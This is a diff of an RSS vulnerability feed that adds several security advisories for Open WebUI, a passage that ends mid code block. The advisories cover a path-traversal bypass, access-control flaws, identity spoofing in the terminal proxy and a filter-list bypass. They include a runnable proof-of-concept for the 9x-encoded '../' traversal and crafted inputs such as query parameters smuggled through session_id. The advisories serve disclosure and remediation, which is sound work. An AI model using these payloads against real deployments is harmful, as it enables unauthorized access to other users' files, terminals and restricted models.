@@ -7,7 +7,886 @@
     <atom:link href="https://stephen-cox.github.io/vulnfeed/feed.xml" rel="self"/>
     <docs>http://www.rssboard.org/rss-specification</docs>
     <generator>python-feedgen</generator>
-    <lastBuildDate>Thu, 02 Jul 2026 07:27:42 +0000</lastBuildDate>
+    <lastBuildDate>Fri, 03 Jul 2026 06:58:23 +0000</lastBuildDate>
+    <item>
+      <title>[HIGH] open-webui/open-webui – open-webui terminal proxy path traversal guard bypass via 9x encoded traversal</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-frvj-c5qp-xj4w</link>
+      <description>AI assistance was used to help inspect the code and prepare this report.&#13;
+&#13;
+## Summary&#13;
+&#13;
+The fix for GHSA-r2wg-2mcr-66rv is incomplete in v0.9.6 and current main. `backend/open_webui/routers/terminals.py` documents `_sanitize_proxy_path()` as decoding until stable, but the implementation stops after 8 `unquote()` passes. A 9x percent-encoded `../...` path parameter remains once-encoded after the loop, passes the `posixpath.normpath()` and `cleaned.startswith('..')` checks, and is forwarded to the configured terminal server. The upstream server then receives a decoded traversal path such as `/base/../admin/system`.&#13;
+&#13;
+## Impact&#13;
+&#13;
+A user who has access to an admin-configured terminal connection can bypass the terminal proxy path traversal guard and cause Open WebUI to forward requests with the configured terminal credentials and `X-User-Id` header to paths outside the intended normalized proxy path. For orchestrator-backed terminal connections the same sanitized path is placed under `/p/{policy_id}/{safe_path}`, so the bypass can also target sibling or parent routes after upstream decoding. This is a bypass of the same terminal proxy boundary covered by GHSA-r2wg-2mcr-66rv.&#13;
+&#13;
+This does not require adding a malicious terminal server or convincing an administrator to weaken settings. The attacker only needs normal access to an existing configured terminal connection.&#13;
+&#13;
+## Reproduction&#13;
+&#13;
+The following standalone Python script mirrors the current sanitizer and uses a local aiohttp server as the terminal-server canary. It shows that 8x encoding is rejected but 9x encoding is accepted and forwarded as a traversal after the upstream framework decodes the path.&#13;
+&#13;
+```python&#13;
+import asyncio, posixpath&#13;
+from urllib.parse import unquote&#13;
+from aiohttp import web, ClientSession, ClientTimeout&#13;
+&#13;
+def sanitize(path):&#13;
+    decoded = path&#13;
+    for _ in range(8):&#13;
+        once = unquote(decoded)&#13;
+        if once == decoded:&#13;
+            break&#13;
+        decoded = once&#13;
+    cleaned = posixpath.normpath(decoded).lstrip('/')&#13;
+    if cleaned.startswith('..') or cleaned == '.':&#13;
+        return None&#13;
+    return cleaned&#13;
+&#13;
+def enc(s, rounds):&#13;
+    out = ''.join(f'%{b:02X}' for b in s.encode())&#13;
+    for _ in range(rounds - 1):&#13;
+        out = out.replace('%', '%25')&#13;
+    return out&#13;
+&#13;
+async def main():&#13;
+    async def handler(request):&#13;
+        return web.json_response({'raw_path': request.raw_path, 'path': request.path})&#13;
+    app = web.Application()&#13;
+    app.router.add_route('*', '/{tail:.*}', handler)&#13;
+    runner = web.AppRunner(app)&#13;
+    await runner.setup()&#13;
+    site = web.TCPSite(runner, '127.0.0.1', 0)&#13;
+    await site.start()&#13;
+    port = site._server.sockets[0].getsockname()[1]&#13;
+&#13;
+    for rounds in (8, 9):&#13;
+        safe = sanitize(enc('../admin/system', rounds))&#13;
+        print(rounds, safe)&#13;
+        if safe:&#13;
+            url = f'http://127.0.0.1:{port}/base/{safe}'&#13;
+            async with ClientSession(timeout=ClientTimeout(total=10)) as session:&#13;
+                async with session.get(url) as response:&#13;
+                    print(await response.json())&#13;
+    await runner.cleanup()&#13;
+&#13;
+asyncio.run(main())&#13;
+```&#13;
+&#13;
+Observed output on current main and v0.9.6 sanitizer:&#13;
+&#13;
+```text&#13;
+8 None&#13;
+9 %2E%2E%2F%61%64%6D%69%6E%2F%73%79%73%74%65%6D&#13;
+{'raw_path': '/base/..%2Fadmin%2Fsystem', 'path': '/base/../admin/system'}&#13;
+```&#13;
+&#13;
+The 9x encoded path argument is 285 bytes long, so this is not a megabyte-sized or impractical URL. When sent through the real route, account for the ASGI server decoding the HTTP path once before filling the `{path:path}` parameter: an external request can use one additional encoding layer so `_sanitize_proxy_path()` receives the 9x encoded parameter shown above.&#13;
+&#13;
+## Root Cause / Technical Details&#13;
+&#13;
+`_sanitize_proxy_path()` in `backend/open_webui/routers/terminals.py` performs this loop:&#13;
+&#13;
+```python&#13;
+decoded = path&#13;
+for _ in range(8):&#13;
+    once = unquote(decoded)&#13;
+    if once == decoded:&#13;
+        break&#13;
+    decoded = once&#13;
+```&#13;
+&#13;
+The subsequent traversal check is applied only to the value after those 8 iterations. If the input still contains encoded dot and slash bytes after the loop, `posixpath.normpath()` treats them as ordinary characters rather than path separators. The code then builds `target_url = f'{base_url}/{safe_path}'` and sends it with `aiohttp.ClientSession.request()`. The upstream server receives and decodes the forwarded path, turning the accepted `%2E%2E%2F...` into `../...`.&#13;
+&#13;
+The same vulnerable sanitizer is present in v0.9.6, the latest release. I verified the v0.9.6 `backend/open_webui/routers/terminals.py` hash matches current main for this file.&#13;
+&#13;
+## Remediation&#13;
+&#13;
+Do not rely on a fixed decode-depth cap for a traversal security boundary. Recommended fixes:&#13;
+&#13;
+1. Decode until stable with a strict input length cap, and reject if the final value still contains encoded dot, slash, or backslash separators.&#13;
+2. Reconstruct the allowed relative path from fully decoded segments: split on path separators, reject empty/current/parent segments, then join allowed segments with `/`.&#13;
+3. Add regression tests for at least 9x and 10x encoded `../` payloads, including a route-level test that accounts for the ASGI server's initial path decode before the `{path:path}` parameter reaches `_sanitize_proxy_path()`.&#13;
+</description>
+      <guid isPermaLink="false">GHSA-frvj-c5qp-xj4w</guid>
+      <pubDate>Thu, 02 Jul 2026 19:47:03 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui – Arena task endpoints can bypass underlying model access controls</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-m3qf-58wf-w979</link>
+      <description>## Summary&#13;
+&#13;
+An authenticated non-admin user with read access to an arena wrapper model can reach a restricted underlying model through task endpoints such as `/api/v1/tasks/moa/completions`.&#13;
+&#13;
+The normal chat route resolves arena models before the final chat dispatch and therefore re-checks the selected underlying model. The task routes call `utils.chat.generate_chat_completion()` directly. In that direct path, arena fallback resolution happens after the wrapper access check and then recurses with `bypass_filter=True`, skipping the selected submodel's access check.&#13;
+&#13;
+## Technical Details&#13;
+&#13;
+Open WebUI's current model-access behavior already denies direct access to the restricted model. The normal chat path also denies the selected restricted model after arena preprocessing. The task endpoint path is inconsistent with that protected behavior because it reaches the same restricted model only through the direct arena fallback and recursive `bypass_filter=True`.&#13;
+&#13;
+This report does not rely on malicious provider configuration, user-authored Tools/Functions, or direct code execution. The crossed boundary is model read authorization.&#13;
+&#13;
+Although the arena wrapper must be readable by the user, this is not just an "admin exposed a restricted model" configuration claim. The same configured arena is denied by the normal chat post-preprocessor control once the selected restricted model is the dispatch target. The bypass is specific to task endpoints that skip that preprocessor and enter the fallback arena resolver.&#13;
+&#13;
+Official documentation also points to this interpretation:&#13;
+&#13;
+- Open WebUI documents model access control as restricting models to specific users or groups.&#13;
+- The workspace-model documentation treats "wrapper checked, restricted underlying model reached" as broken access control and recommends independent entries for curated deployments.&#13;
+- The evaluation documentation describes arena mode as an evaluation/comparison feature that randomly selects models to compare, not as a feature that grants access to otherwise restricted models.&#13;
+- This is not an unsafe-admin-action report: the same intended model access restriction is enforced on the direct model path and on the normal-chat selected-model control, then bypassed only through the task endpoint call order.&#13;
+&#13;
+## PoV&#13;
+&#13;
+The attached local PoV does not start a server and does not contact any model provider. It imports the current Open WebUI task endpoint and replaces provider dispatch plus model-access checks with local stubs so the call graph can be observed safely.&#13;
+&#13;
+Observed result:&#13;
+&#13;
+| Case | Expected | Actual |&#13;
+| --- | --- | --- |&#13;
+| Direct task request with `model=restricted-model` | Denied before provider dispatch | Denied; no provider call recorded |&#13;
+| Normal-chat post-preprocessor control with `model=restricted-model` and `metadata.selected_model_id=restricted-model` | Denied before provider dispatch | Denied; no provider call recorded |&#13;
+| Task request with `model=public-arena` that selects `restricted-model` | Denied when selected model is restricted | Local provider stub reached with `model=restricted-model` and `bypass_filter=true` |&#13;
+&#13;
+In the arena task case, the restricted model is absent from the access-check log.&#13;
+&#13;
+## Impact&#13;
+&#13;
+A regular user can use a readable arena wrapper as an oracle for a restricted model via task-generation endpoints. For `/api/v1/tasks/moa/completions`, the caller controls the task prompt and receives the generated response.&#13;
+&#13;
+The crossed security boundary is model read authorization: a non-admin user who is denied direct access to a model can still cause Open WebUI to dispatch a request to that model with the operator-configured backend credentials.&#13;
+&#13;
+This can allow:&#13;
+&#13;
+- use of paid or internal models with the admin-configured provider key;&#13;
+- bypass of model access grants shown in the model selector;&#13;
+- cost and usage impact on pay-per-token providers;&#13;
+- exposure of model behavior or internal deployment capabilities that admins intended to restrict.&#13;
+&#13;
+Suggested CVSS v3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L` = 7.6.&#13;
+&#13;
+Primary CWE: CWE-862, Missing Authorization.&#13;
+&#13;
+Authentication is required, so `PR:L` is used. User interaction is not required. The confidentiality impact is High because the attacker can query a model the administrator intended to restrict. Integrity and availability are Low because the request can consume provider quota and produce model output under an authorization decision the system would otherwise deny.&#13;
+&#13;
+This should not be Critical: exploitation requires an authenticated user and a readable arena wrapper, does not cross into another security authority, and does not provide arbitrary code execution or full instance compromise.&#13;
+&#13;
+## Suggested Fix&#13;
+&#13;
+Do not use `bypass_filter=True` for arena fallback dispatch unless the selected underlying model has already been authorized for the caller.&#13;
+&#13;
+Recommended changes:&#13;
+&#13;
+- after selecting `selected_model_id`, load the selected model and call `check_model_access(user, selected_model)` before recursive dispatch;&#13;
+- for `filter_mode=exclude` or empty `model_ids`, build the candidate pool from models the current user can read, not every non-arena model in `request.app.state.MODELS`;&#13;
+- add regression tests for `/api/v1/tasks/moa/completions`, `/api/v1/tasks/title/completions`, `/api/v1/tasks/tags/completions`, and normal `/api/chat/completions` arena behavior.&#13;
+&#13;
+## Appendix: Affected Components&#13;
+&#13;
+- `backend/open_webui/routers/tasks.py`&#13;
+- `/api/v1/tasks/moa/completions` builds a payload from caller-controlled `model`, `prompt`, and `responses`, then calls `generate_chat_completion(request, form_data=payload, user=user)`.&#13;
+- `backend/open_webui/utils/chat.py`&#13;
+- checks access for the user-supplied arena wrapper model.&#13;
+- fallback arena resolution selects an underlying model when the caller did not pass through `process_chat_payload()`.&#13;
+- recursive dispatch uses `bypass_filter=True`.&#13;
+- `backend/open_webui/utils/models.py`&#13;
+- arena wrapper access checks only wrapper `access_grants`.&#13;
+&#13;
+Current-head references:&#13;
+&#13;
+- `backend/open_webui/routers/tasks.py:662-707`&#13;
+- `backend/open_webui/utils/chat.py:190-204`&#13;
+- `backend/open_webui/utils/chat.py:215-240`&#13;
+- `backend/open_webui/utils/chat.py:248-269`&#13;
+- `backend/open_webui/utils/middleware.py:2323-2347`&#13;
+- `backend/open_webui/utils/models.py:378-407`&#13;
+&#13;
+## Appendix: Duplicate Analysis&#13;
+&#13;
+This is distinct from `GHSA-9vvh-qmjx-p4q8` / `CVE-2026-44555`, which covers `base_model_id` chaining and user-created workspace models. Current head includes the base-model-chain access fix through `has_base_model_access`.&#13;
+&#13;
+This report covers task endpoints that call `generate_chat_completion()` without the main chat preprocessor. The root cause is arena fallback plus recursive `bypass_filter=True`, not `base_model_id`.&#13;
+&#13;
+Live duplicate sweep before submission also reviewed:&#13;
+&#13;
+- `GHSA-v6qf-75pr-p96m`: exposed HTTP query parameter `?bypass_filter=true`. This report does not rely on caller-controlled query parameters; the task endpoint reaches the server-side recursive `bypass_filter=True` path after arena fallback resolution.&#13;
+- `GHSA-hp5m-24vp-vq2q`: `/api/openai/responses` passthrough missing model authorization. This report targets `/api/v1/tasks/moa/completions` and the arena resolver inside `utils.chat.generate_chat_completion()`.&#13;
+- `GHSA-gfm2-xm6c-37qc`: chat ownership authorization in completions. This report does not require another user's chat ID.&#13;
+&#13;
+If maintainers prefer to treat this as the same broad "wrapper checked, underlying model not checked" class, it should still be a distinct exploitation vector and affected component: task endpoints, not model creation/import or `base_model_id` dispatch.&#13;
+&#13;
+## Appendix: Preconditions&#13;
+&#13;
+- Authenticated non-admin user.&#13;
+- The user can read an arena wrapper model, for example a custom arena with a public read grant.&#13;
+- The arena model includes at least one restricted underlying model that the user cannot query directly.&#13;
+</description>
+      <guid isPermaLink="false">GHSA-m3qf-58wf-w979</guid>
+      <pubDate>Thu, 02 Jul 2026 16:33:50 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui – Model meta.knowledge read-only file access can be upgraded to file write/delete</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-2xwm-4h2q-ggfx</link>
+      <description>## Summary&#13;
+&#13;
+Current `main` and `v0.9.6` still allow an authenticated user to turn read-only access to another user's file into write/delete access by attaching that file ID to an attacker-controlled workspace model.&#13;
+&#13;
+This is an incomplete-fix variant of `GHSA-vjqm-6gcc-62cr`. The current fix adds `_verify_knowledge_file_access()`, but the validator only checks `has_access_to_file(file_id, "read", user)`. The file write/delete routes later trust `has_access_to_file(file_id, "write", user)`, and that function grants access through any writable model whose `meta.knowledge` contains the file ID.&#13;
+&#13;
+The PoV includes a negative control showing the current validator rejects an inaccessible arbitrary file ID. The residual issue is narrower: a file ID that is readable only through a KB read grant is accepted into direct model file metadata, then the same model metadata satisfies later file write/delete checks.&#13;
+&#13;
+## Technical Details&#13;
+&#13;
+`backend/open_webui/routers/models.py::_verify_knowledge_file_access()` accepts model `meta.knowledge` file entries when the caller can read the file:&#13;
+&#13;
+```python&#13;
+if not await has_access_to_file(file_id, 'read', user, db=db):&#13;
+    raise HTTPException(...)&#13;
+```&#13;
+&#13;
+`backend/open_webui/utils/access_control/files.py::has_access_to_file()` then uses attacker-writable model metadata as a source for any requested access type:&#13;
+&#13;
+```python&#13;
+for model in await Models.get_models_by_user_id(user.id, permission=access_type, db=db):&#13;
+    knowledge_items = getattr(model.meta, 'knowledge', None) or []&#13;
+    for item in knowledge_items:&#13;
+        if isinstance(item, dict) and item.get('type') == 'file' and item.get('id') == file.id:&#13;
+            return True&#13;
+```&#13;
+&#13;
+For `access_type="write"`, the attacker-owned model satisfies the model query, so the victim file becomes writable even though the attacker only had read access through the KB grant.&#13;
+&#13;
+This crosses another user's integrity and availability boundary, not just the attacker's own account. Before model metadata is involved, the attacker can read the file through a KB grant but cannot write it. After the model metadata entry is accepted, the same file becomes writable/deletable.&#13;
+&#13;
+The official docs distinguish attached knowledge permissions: knowledge-base collections may use explicit read grants, while individual files are owner/admin-only. This issue lets a read grant to a KB become direct write/delete authority over an individual file.&#13;
+&#13;
+This is also consistent with the documented RBAC model: resource grants have separate `read` and `write` permissions, where write means the user can update or delete the resource. The exploit starts from a read-only KB grant and reaches file write/delete without a corresponding file owner/admin/write authorization.&#13;
+&#13;
+The required Models workspace access is not root-equivalent in Open WebUI's documentation. The policy's root-equivalent warning applies to Tools/Functions code execution. This report does not use Tools/Functions, custom Python, admin actions, or a legacy-only path.&#13;
+&#13;
+## Impact&#13;
+&#13;
+An authenticated non-admin user with Models workspace access and read-only access to a victim file through a knowledge-base grant can create/import/update a model that references the file, then rename, overwrite, or delete the victim user's file through write-gated file routes.&#13;
+&#13;
+Confirmed sinks in current head:&#13;
+&#13;
+- `POST /api/v1/files/{id}/rename`&#13;
+- `POST /api/v1/files/{id}/data/content/update`&#13;
+- `DELETE /api/v1/files/{id}`&#13;
+&#13;
+Suggested severity: High.&#13;
+&#13;
+Suggested CVSS:&#13;
+&#13;
+```text&#13;
+CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H&#13;
+```&#13;
+&#13;
+Suggested CWE:&#13;
+&#13;
+```text&#13;
+CWE-863: Incorrect Authorization&#13;
+```&#13;
+&#13;
+I am not claiming Critical severity because the attacker must be authenticated, must have Models workspace access, and must already have read-only access to the victim file through a KB grant. The High score is based on the post-condition: that limited read access becomes destructive cross-user file write/delete.&#13;
+&#13;
+## Appendix: AI Disclosure&#13;
+&#13;
+## Appendix: Local PoV&#13;
+&#13;
+The PoV is local-only. It does not start a server, send network traffic, or use a real database. It loads and executes the current-head function bodies for:&#13;
+&#13;
+- `has_access_to_file()`&#13;
+- `_verify_knowledge_file_access()`&#13;
+- `delete_file_by_id()`&#13;
+&#13;
+Run from the harness root:&#13;
+&#13;
+```bash&#13;
+uv run python attached-evidence/poc/pov_openwebui_model_file_read_to_write.py&#13;
+```&#13;
+&#13;
+Observed output:&#13;
+&#13;
+```json&#13;
+{&#13;
+  "confirmed": true,&#13;
+  "control_inaccessible_file_rejected_by_validator": true,&#13;
+  "control_read_allowed_via_kb_read_grant": true,&#13;
+  "control_write_allowed_before_model_laundering": false,&#13;
+  "model_metadata_validator_passed_with_read_only_access": true,&#13;
+  "write_allowed_after_attacker_owned_model_contains_file": true,&#13;
+  "delete_route_result": {&#13;
+    "message": "File deleted successfully"&#13;
+  },&#13;
+  "deleted_file_ids": [&#13;
+    "victim-file"&#13;
+  ]&#13;
+}&#13;
+```&#13;
+&#13;
+This demonstrates expected versus actual behavior:&#13;
+&#13;
+- Expected: a user with only read access through a KB grant cannot mutate the victim file.&#13;
+- Actual: after the read-only file ID is accepted into attacker-owned model metadata, the same user satisfies the file write/delete guard and deletes the victim file.&#13;
+&#13;
+## Appendix: Remediation&#13;
+&#13;
+Recommended defense-in-depth fix:&#13;
+&#13;
+1. In `_verify_knowledge_file_access()`, require direct file ownership or admin for `type: "file"` model knowledge entries. Do not accept indirect KB read access as sufficient authority to attach an individual file to a model.&#13;
+2. In `has_access_to_file()`, do not let the model `meta.knowledge` branch grant write access to files. Model-attached knowledge should be read-only unless the caller separately owns/administers the underlying file or has an explicit write-capable file authorization path.&#13;
+3. Add regression tests covering the KB-read control, the blocked model attach, and rename/update/delete denial for the victim file.&#13;
+</description>
+      <guid isPermaLink="false">GHSA-2xwm-4h2q-ggfx</guid>
+      <pubDate>Thu, 02 Jul 2026 15:58:11 +0000</pubDate>
+    </item>
+    <item>
+      <title>[HIGH] open-webui/open-webui – Terminal proxy forwards a spoofable, integrity-unbound user identity to the upstream (X-User-Id header and ws_terminal session_id query injection)</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-j657-m4c4-24jq</link>
+      <description>## Summary&#13;
+&#13;
+The terminal proxy in `backend/open_webui/routers/terminals.py` forwards the Open WebUI user's identity to the upstream terminal server / backend coordinator as an authorization claim, with no cryptographic binding to the session that produced it. The forwarded identity is attacker-influenceable on both proxy paths:&#13;
+&#13;
+1. **HTTP path (`proxy_terminal`)** sets `headers['X-User-Id'] = user.id`. Upstreams that trust `X-User-Id` as identity receive it unsigned, so an attacker who can reach the upstream by other means (directly, a compromised peer, SSRF) can spoof it.&#13;
+2. **WebSocket path (`ws_terminal`)** is exploitable through Open WebUI itself, with no "other means" required. It interpolates the path parameter `session_id` directly into the upstream URL and then appends `?user_id=&lt;caller&gt;`:&#13;
+&#13;
+   ```python&#13;
+   upstream_url = f'{ws_base}/p/{policy_id}/api/terminals/{session_id}'&#13;
+   upstream_url += f'?{urllib.parse.urlencode({"user_id": user.id})}'&#13;
+   ```&#13;
+&#13;
+`session_id` is neither validated nor URL-encoded (the HTTP sibling runs `_sanitize_proxy_path`; this path runs nothing). An encoded `?`/`&amp;` smuggled through `session_id` survives Open WebUI's single decode and is re-decoded by the upstream, injecting an attacker-chosen `user_id` ahead of the appended one. Query parsing binds the first occurrence, so the backend coordinator resolves the spoofed user's terminal scope.&#13;
+&#13;
+## Technical Details&#13;
+&#13;
+The forwarded terminal identity is a bearer-style authorization claim with no integrity binding, and on the WebSocket path it is additionally injectable because `session_id` is concatenated into the URL without encoding or delimiter validation.&#13;
+&#13;
+## Impact&#13;
+&#13;
+A normal authenticated user can make the terminal proxy present another user's identity to the upstream backend coordinator. On backend coordinator-backed (`policy_id`) servers that scope terminal containers by `user_id`, this reaches another user's terminal scope; combined with a known active session ID (for example a chat-scoped session ID surfaced through a shared chat), it allows attaching to that user's live PTY. The HTTP-path variant additionally allows identity spoofing at the upstream tier for any deployment whose upstream trusts `X-User-Id`.&#13;
+&#13;
+## Appendix: Affected code&#13;
+&#13;
+- `backend/open_webui/routers/terminals.py` — `proxy_terminal` sets `headers['X-User-Id'] = user.id` with no signature.&#13;
+- `backend/open_webui/routers/terminals.py` — `ws_terminal` builds the upstream URL from an unvalidated, unencoded `session_id` and appends `user_id` as a query parameter, allowing query injection.&#13;
+&#13;
+## Appendix: Consolidation&#13;
+&#13;
+Per the Report Handling policy, this consolidates independent reports of the same root cause (the forwarded terminal identity is spoofable / not integrity-bound) into the earliest filing:&#13;
+&#13;
+- **@smoke-wolf** (earliest filing) — the `X-User-Id` HTTP-path identity is forwarded without integrity binding, spoofable where the upstream trusts the header.&#13;
+- **@rexpository** — the `ws_terminal` `session_id` query-injection vector, proving the forwarded `user_id` is spoofable through the Open WebUI proxy itself, with no "reach the upstream by other means" precondition.&#13;
+&#13;
+## Appendix: Recommended fix&#13;
+&#13;
+- Validate and URL-encode `session_id` before building the upstream URL (`urllib.parse.quote(session_id, safe="")`; reject `?`, `#`, `&amp;`, `/`, `%`, backslash, control characters). Build the query string with a URL builder so attacker-controlled path content cannot precede it.&#13;
+- Bind the forwarded identity instead of passing a raw `user_id` / `X-User-Id`: emit a short-lived signed claim (for example HS256 over `{uid, iat, aud:server_id}` with a key shared only with the specific upstream) and verify it upstream.&#13;
+</description>
+      <guid isPermaLink="false">GHSA-j657-m4c4-24jq</guid>
+      <pubDate>Thu, 02 Jul 2026 15:10:12 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] open-webui/open-webui – `WEB_FETCH_FILTER_LIST` host allow/block filter bypassable via URL path and non-label-boundary matching</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-qg3f-8x3j-ggf2</link>
+      <description>## Summary&#13;
+&#13;
+The administrator-configured `WEB_FETCH_FILTER_LIST` (the allow/block list applied to server-side web fetches: RAG URL ingestion, URL-to-markdown, web-search content fetch) matches hostnames incorrectly, so the filter can be bypassed.&#13;
+&#13;
+## Details&#13;
+&#13;
+`is_string_allowed` (`backend/open_webui/utils/misc.py`) matches with `str.endswith(...)`, and the primary web-fetch call site (`backend/open_webui/retrieval/web/utils.py`) called it with the **full URL string**, not the hostname:&#13;
+&#13;
+- **Blocklist bypass via path.** A blocklist entry `!internal.example.com` only matches a URL that *ends with* that string. Any URL with a path (`https://internal.example.com/x`) ends with `/x`, so the entry never matches and the fetch proceeds. The blocklist effectively only stopped path-less URLs.&#13;
+- **Allowlist false-reject and bypass.** An allowlist `company.com` rejected the legitimate `https://api.company.com/status` and admitted `https://attacker.example/path/company.com`.&#13;
+- **Non-label-boundary matching** at the hostname-shaped call site (`retrieval/web/main.py`): `endswith('corp.com')` also matched `evilcorp.com`, and `10.0.0.1` matched `110.0.0.1`.&#13;
+&#13;
+## Impact&#13;
+&#13;
+An authenticated user able to trigger a server-side web fetch can reach hosts the administrator intended to block with `WEB_FETCH_FILTER_LIST`.&#13;
+&#13;
+Open WebUI's primary SSRF protection is a separate, always-on guard that rejects any URL resolving to a non-global IP (`validate_url` and the connection-layer `_ssrf_safe_new_conn`, active whenever `ENABLE_RAG_LOCAL_WEB_FETCH` is off, the default). That guard is unaffected by this issue and continues to block loopback, RFC1918 and link-local addresses, including the `169.254.169.254` cloud-metadata endpoint. This bypass therefore does **not** grant access to those internal targets. What it defeats is the administrator's ability to block specific **publicly-resolvable** hosts (internal services reachable from the server over a public IP, e.g. split-horizon DNS or internal PaaS endpoints) and to enforce an allowlist. Fetched content is returned to the requester, so for hosts reachable from the server's network position this is a read/content-disclosure SSRF against the admin-blocked host.&#13;
+&#13;
+## Patch&#13;
+&#13;
+Matching is now performed on the parsed hostname using DNS label boundaries. A dedicated `is_host_allowed(host, ...)` matches an entry only when host and entry are equal or the entry is a parent domain (`host == entry or host.endswith('.' + entry)`), so `corp.com` matches `api.corp.com` but not `evilcorp.com`, and IP entries match only the identical address. Both web-fetch call sites pass the parsed hostname rather than the full URL. The generic `is_string_allowed` is retained unchanged for unrelated non-host filters.&#13;
+&#13;
+## Credit&#13;
+&#13;
+Reported by @addcontent.</description>
+      <guid isPermaLink="false">GHSA-qg3f-8x3j-ggf2</guid>
+      <pubDate>Thu, 02 Jul 2026 14:56:49 +0000</pubDate>
+    </item>
+    <item>
+      <title>[LOW] open-webui/open-webui – Private channel messages can be disclosed through cross-channel thread parent_id binding</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-73x5-h92w-xc2j</link>
+      <description>## Summary&#13;
+&#13;
+A normal authenticated user can read the content of a message in a private channel they do not belong to. `GET /api/v1/channels/{id}/messages/{message_id}/thread` authorizes the caller against the URL channel, but the underlying thread lookup loads the thread *parent* by id and returns it without verifying the parent belongs to that channel. By requesting a thread in a channel they can access while supplying a victim channel's message id as the thread root, the attacker receives the victim message — content, channel id, and author.&#13;
+&#13;
+## Affected component&#13;
+&#13;
+- `backend/open_webui/models/messages.py` — `get_messages_by_parent_id()`&#13;
+- `backend/open_webui/routers/channels.py` — `get_channel_thread_messages()` (read), `new_message_handler()` (parent/reply binding on write)&#13;
+&#13;
+## Root cause&#13;
+&#13;
+`get_messages_by_parent_id(channel_id, parent_id)` filters the thread *replies* by `channel_id`, but loads the thread *parent* by id alone and appends it without requiring `parent.channel_id == channel_id`:&#13;
+&#13;
+```python&#13;
+message = await db.get(Message, parent_id)     # loaded by id only — no channel binding&#13;
+if not message:&#13;
+    return []&#13;
+# replies are filtered by channel_id ...&#13;
+if len(all_messages) &lt; limit:&#13;
+    all_messages.append(message)               # parent appended unconditionally&#13;
+```&#13;
+&#13;
+`get_channel_thread_messages()` authorizes only the URL channel, then calls `get_messages_by_parent_id(id, message_id)` with the caller-supplied `message_id`. The reply insert path (`new_message_handler` → `insert_new_message`) also stored a caller-supplied `parent_id` without binding it to the channel.&#13;
+&#13;
+## Impact&#13;
+&#13;
+A non-member can disclose the content (plus channel id and author metadata) of a private-channel message whose id they know or obtain. Direct reads of the victim channel/message/thread return 403; the disclosure is via the thread parent of a channel the attacker can access. Read-only, one message per known id.&#13;
+&#13;
+## Proof of Concept&#13;
+&#13;
+(reporter) Validated on v0.9.6: `GET /channels/{attacker_channel}/messages/{victim_message_id}/thread` returned the victim's private message — content, victim channel id, and author — although direct reads of the victim channel returned 403.&#13;
+&#13;
+## Fix&#13;
+&#13;
+Bind the thread parent to the requested channel: `get_messages_by_parent_id` returns `[]` unless the parent exists and `parent.channel_id == channel_id`. Defence-in-depth on the write path: `new_message_handler` rejects a supplied `parent_id`/`reply_to_id` whose message does not belong to the URL channel.&#13;
+&#13;
+## Affected / Patched&#13;
+&#13;
+- Affected: `&lt; 0.10.0` (last affected release 0.9.6)&#13;
+- Patched: v0.10.0 (PR #25766). `get_messages_by_parent_id` binds the thread parent to the requested channel (returns `[]` unless `parent.channel_id == channel_id`), and `new_message_handler` rejects a caller-supplied `parent_id`/`reply_to_id` whose message does not belong to the channel.</description>
+      <guid isPermaLink="false">GHSA-73x5-h92w-xc2j</guid>
+      <pubDate>Thu, 02 Jul 2026 14:45:45 +0000</pubDate>
+    </item>
+    <item>
+      <title>[LOW] open-webui/open-webui – Cross-user model-list exposure via static cache key in get_all_models (aiocache key= vs key_builder= misuse)</title>
+      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-3wp3-xxj9-5jqq</link>
+      <description>## Summary&#13;
+&#13;
+The `get_all_models` handlers in `routers/openai.py` and `routers/ollama.py` intended to cache their **permission-filtered** model lists per user, but the `@cached` decorator was misconfigured: it passed a `key=` lambda instead of `key_builder=`. In aiocache 0.12.3 (the pinned version), `key=` is a **static** cache key — a callable passed there is used as a constant object, not invoked per call. As a result the per-user key was never computed, and all callers collided onto a single shared cache entry within the TTL window. During that window, one user's permission-filtered model list could be served to a different authenticated user, crossing the per-user authorization boundary.&#13;
+&#13;
+## Impact&#13;
+&#13;
+- **Boundary crossed:** Confidentiality (cross-user). A caller can receive the model list scoped to a *different* security principal than themselves.&#13;
+- A user (or admin, or — depending on endpoint reachability — anonymous caller) who populates the cache causes the next caller within the TTL to receive *that* list rather than their own permission-filtered one.&#13;
+- What's disclosed is the set of models another principal can access, including potentially the existence and naming of models restricted from the receiving user.&#13;
+- Exposure is **incidental and timing-dependent**, not attacker-controlled: the leaked entry is whatever the most recent caller populated within `MODELS_CACHE_TTL` (default 1 second), and the attacker cannot select the victim or force a target's list into the cache.&#13;
+&#13;
+## Affected component&#13;
+&#13;
+- `backend/open_webui/routers/openai.py` — `get_all_models` (~line 488)&#13;
+- `backend/open_webui/routers/ollama.py` — `get_all_models` (~line 302)&#13;
+&#13;
+Both decorated with `@cached(ttl=MODELS_CACHE_TTL, key=lambda ...)`. No other `@cached(... key=lambda ...)` misuse was found elsewhere in the backend.&#13;
+&#13;
+## Root cause&#13;
+&#13;
+aiocache 0.12's `@cached` treats `key=` as a static key; the per-call hook is `key_builder=` with signature `key_builder(func, *args, **kwargs)`. Passing a callable to `key=` uses the callable object itself as a constant key, so every invocation resolved to the same entry and the intended per-`user.id` namespacing never occurred.&#13;
+&#13;
+## Reproduction (default config)&#13;
+&#13;
+1. On a default deployment, configure at least two users with *different* model-access permissions (e.g. one model restricted to user A).&#13;
+2. As user A, request the model list (populates the shared cache entry).&#13;
+3. Within `MODELS_CACHE_TTL` (default 1s), as user B, request the model list.&#13;
+4. User B receives user A's permission-filtered list, including models B is not permitted to see.&#13;
+&#13;
+## Remediation&#13;
+&#13;
+Replace `key=` with `key_builder=` at both call sites and adjust the lambda to take the function as its first argument:&#13;
+&#13;
+```python&#13;
+@cached(&#13;
